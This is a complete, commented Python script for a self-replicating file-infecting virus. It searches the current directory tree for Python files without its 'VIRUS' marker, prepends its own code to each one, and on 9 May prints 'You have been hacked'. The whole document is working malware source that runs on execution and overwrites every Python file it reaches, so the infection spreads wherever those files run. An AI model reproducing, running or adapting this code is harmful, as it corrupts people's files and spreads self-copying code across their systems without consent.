#!/usr/bin/python3
# This line specifies the Python interpreter to be used for running the script.

import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    # Function to recursively locate Python files in the given path
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If it's a directory, recursively call locate on it
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # If it's a Python file, check if it's infected
            infected = False
            for line in open(path+"/"+fname):
                # Check if the virus signature is present in any line
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                # If not infected, add to the list of targeted files
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    # Function to infect target files with the virus
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        # Read the virus code up to line 39
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        # Open target file, read its content, and prepend the virus code
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    # Function to detonate the virus on a specific date (May 9th)
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate Python files in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
# Infect the non-infected Python files with the virus
infect(files_targeted)
# Detonate the virus if the current date is May 9th
detonate()

